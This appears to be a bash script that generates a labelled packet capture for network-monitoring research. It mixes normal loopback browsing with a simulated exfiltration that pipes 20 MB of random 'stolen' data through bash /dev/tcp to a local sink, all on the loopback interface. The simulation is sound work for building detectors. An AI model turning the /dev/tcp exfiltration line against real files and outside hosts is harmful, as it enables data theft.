#!/usr/bin/env bash
set -e
OUT=~/netobs/data/raw/exfil
mkdir -p "$OUT" && cd "$OUT"

# Sink that reads and discards everything sent to it.
python3 - << 'PY' &
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.2", 9000)); s.listen(8)
while True:
    c, _ = s.accept()
    while c.recv(1 << 16):
        pass
    c.close()
PY
SINK=$!

python3 -m http.server 8080 --bind 127.0.0.1 > /dev/null 2>&1 &
WEB=$!
sleep 1

echo "capturing..."
sudo timeout 45 tcpdump -i lo -w exfil.pcap 2>/dev/null &
sleep 3

echo "normal browsing..."
for i in $(seq 1 15); do
  curl -s http://127.0.0.1:8080/ > /dev/null
  sleep 0.3
done

echo "exfiltrating..."
head -c 20000000 /dev/urandom > /tmp/stolen.bin
for i in $(seq 1 6); do
  cat /tmp/stolen.bin > /dev/tcp/127.0.0.2/9000
  sleep 1
done

echo "waiting for capture to finish..."
wait
kill $SINK $WEB 2>/dev/null || true
rm -f /tmp/stolen.bin
ls -lh exfil.pcap
